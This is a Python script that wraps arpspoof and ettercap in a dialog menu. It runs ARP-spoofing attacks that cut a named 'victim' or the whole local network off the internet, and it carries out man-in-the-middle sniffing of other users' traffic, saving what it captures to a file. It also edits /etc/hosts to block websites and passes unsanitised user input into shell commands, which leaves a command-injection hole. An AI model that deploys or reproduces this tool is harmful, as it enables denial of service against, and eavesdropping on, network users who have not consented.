#! /usr/bin/python

import os
import commands
import time
import signal
import thread

def a():
	def handler(signum, frame):
		os.system("dialog --infobox 'The internet blocking has been stopped. \nThank You. ' 10 40")
		os.system("killall arpspoof")
		arp() 

	signal.signal(signal.SIGTSTP, handler)

	def my(x,y):
		os.system("dialog --infobox 'Spoofing Stopped.\nThank You. \n Bringing details. ' 10 40")
		time.sleep(1)
		os.system("killall ettercap")
		os.system("dialog --msgbox 'The Spoofing details are stored at /root/Desktop/details.txt' 10 40")		
		os.system("dialog --textbox /root/Desktop/details.txt 20 80")
		arp()
  

	signal.signal(2,my)

	os.system("dialog --infobox '	  Welcome to the Spoofing tool  ' 10 40") 
	time.sleep(2)
	def arp():
		os.system("dialog --title 'MITM & Blocking' --menu 'Select Your Choice : ' 20 100 7 1 'Block the internet of someone specific on your network ' 2 'Block everyone(s) internet access on the network. ' 3 'Perform Packet Sniffing on others. ' 4 'Block/Unblock a website(URL).' 5 'Back' 2> /root/Desktop/Project/choice.txt")
		f=open('/root/Desktop/Project/choice.txt','r')
		c=f.read()

		if c=='1':
			os.system("dialog --inputbox 'Enter Victim(s) IP Address : ' 10 50 2> /root/Desktop/Project/hello.txt")
			f=open('/root/Desktop/Project/hello.txt','r')
			x=f.read()
			os.system("dialog --infobox 'Internet Access blocking process in progress....\nFetching Data.. \nPerforming Operations.... ' 10 40")
			time.sleep(1)
			#os.system("service network restart > /dev/null")
			#os.system("arp -a | awk -F '[()]' '{print $2}' > /root/Desktop/Project/route.txt")
			os.system("route -n | grep UG | awk '{print $2}' > /root/Desktop/Project/route.txt")	
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
			f=open('/root/Desktop/Project/route.txt','r')
			y=f.read()
			os.system("dialog --infobox 'The internet access for this client is successfully blocked. \nPress Ctrl + Z to stop blocking.' 10 40")
			a=commands.getoutput("arpspoof -i wlan0 -t "+x+" "+y+" 2> /dev/null")
		
		if c=='2':
			os.system("dialog --infobox 'Internet Access blocking process in progress.....\nPlease wait for few seconds. ' 10 40")
			#os.system("service network restart > /dev/null")
			#os.system("arp -a | awk -F '[()]' '{print $2}' > /root/Desktop/Project/route.txt")
			os.system("route -n | grep UG | awk '{print $2}' > /root/Desktop/Project/route.txt")
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
			f=open('/root/Desktop/Project/route.txt','r')
			y=f.read()
			os.system("dialog --infobox 'The internet access of everyone is successfully blocked.\nPress Ctrl + Z to stop blocking. ' 10 40")
			a=commands.getoutput("arpspoof -i eth0   "+y+" 2> /dev/null")


		if c=='3':
			os.system("dialog --menu 'Select Packet Sniffing options : ' 20 100 7 1 'Sniff packets of someone specific to the internet - ONE TO ONE. ' 2 'Sniff packets of someone specific with everyone - ONE TO ALL ' 3 'Sniffing packets of everyone on network - ALL TO ALL. ' 4 'Back' 2> /root/Desktop/Project/choice.txt")
			f=open('/root/Desktop/Project/choice.txt','r')
			d=f.read()
			if d=='1':
				f=open('/root/Desktop/Project/hello.txt','w')
				f.write('/')
				f.close()
				os.system("dialog --inputbox 'Enter Victim(s) IP Address : ' 10 50 2>> /root/Desktop/Project/hello.txt")
				f=open('/root/Desktop/Project/hello.txt','a')
				f.write('/ /')
				f.close()
				ro=commands.getoutput("route -n | grep UG | awk '{print $2}'")
				os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
				f=open('/root/Desktop/Project/hello.txt','a')
				f.write(ro)
				f.write('/')			
				f.close()
				f=open('/root/Desktop/Project/hello.txt','r')
				x=f.read()
				os.system("dialog --infobox 'The Spoofing Process is going on.. \n Press Ctrl + C to stop spoofing and view the report. ' 10 40")			
				l=commands.getoutput("ettercap -i wlan0 -T -M arp:remote "+x+" > /root/Desktop/details.txt")
	

			if d=='2':
				f=open('/root/Desktop/Project/hello.txt','w')
				f.write('/')
				f.close()
				os.system("dialog --inputbox 'Enter Victim(s) IP Address : ' 10 50 2>> /root/Desktop/Project/hello.txt")
				f=open('/root/Desktop/Project/hello.txt','a')
				f.write('/ //')
				f.close()
				#ro=commands.getoutput("route -n | grep UG | awk '{print $2}'")
				os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
				#f=open('/root/Desktop/Project/hello.txt','a')
				#f.write(ro)
				#f.write('/')			
				#f.close()
				f=open('/root/Desktop/Project/hello.txt','r')
				x=f.read()
				os.system("dialog --infobox 'The Spoofing Process is going on.. \n Press Ctrl + C to stop spoofing and view the report. ' 10 40")			
				l=commands.getoutput("ettercap -i wlan0 -T -M arp:remote "+x+" > /root/Desktop/details.txt")
	
			if d=='3':
				f=open('/root/Desktop/Project/hello.txt','w')
				f.write('// //')
				f.close()
				#ro=commands.getoutput("route -n | grep UG | awk '{print $2}'")
				os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
				#f=open('/root/Desktop/Project/hello.txt','a')
				#f.write(ro)
				#f.write('/')			
				#f.close()
				f=open('/root/Desktop/Project/hello.txt','r')
				x=f.read()
				os.system("dialog --infobox 'The Spoofing Process is going on.. \n Press Ctrl + C to stop spoofing and view the report. ' 10 40")			
				l=commands.getoutput("ettercap -i wlan0 -T -M arp:remote "+x+" > /root/Desktop/details.txt")
			if d=='4':
				arp()

		if c=='4':
			os.system("dialog --title 'URL Block & Unblock' --menu 'Choose Desired Option : ' 20 100 7 1 'Block a Website (URL) ' 2 'View List of Blocked sites (URL)' 3 'Unblock a site (URL) ' 4 'Back' 2> /root/Desktop/dump/choice.txt")
			f=open('/root/Desktop/dump/choice.txt','r')
			d=f.read()
			if d=='1':
				os.system("dialog --title 'Website Blocker' --inputbox 'Enter the URL of the website that you want to block (Ex: www.google.com)' 10 50 2> /root/Desktop/dump/urlblock")
				f=open('/root/Desktop/dump/urlblock','r')
				url=f.read()
				f=open('/etc/hosts','a')
				f.write("\n")
				f.write("127.0.0.1 ")
				f.write(url)
				f.close()
				os.system("service network-manager restart > /dev/null")
				os.system("dialog --msgbox 'The Website has been Successfully Blocked.' 10 50")
				arp()
			if d=='2':
				os.system("cat /etc/hosts | cut -d ' ' -f2 > /root/Desktop/dump/list")
				os.system("dialog --title 'List Blocked' --textbox /root/Desktop/dump/list 20 60")
				arp()
			if d=='3':
				os.system("dialog --title 'Website Unblocker' --inputbox 'Enter URL of the Website that you want to unblock' 10 50 2> /root/Desktop/dump/urlunblock")
				f=open('/root/Desktop/dump/urlunblock','r')
				unblock=f.read()
				os.system("grep -v "+unblock+" /etc/hosts > /root/Desktop/dump/unblocker")
				os.system("mv /root/Desktop/dump/unblocker /etc/hosts")
				os.system("service network-master restart")
				os.system("dialog --msgbox 'The Website has been Successfully Unblocked.' 10 50")
				arp()
			if d=='4':
				arp()

		if c==5:	
			exit()

	arp()
a()

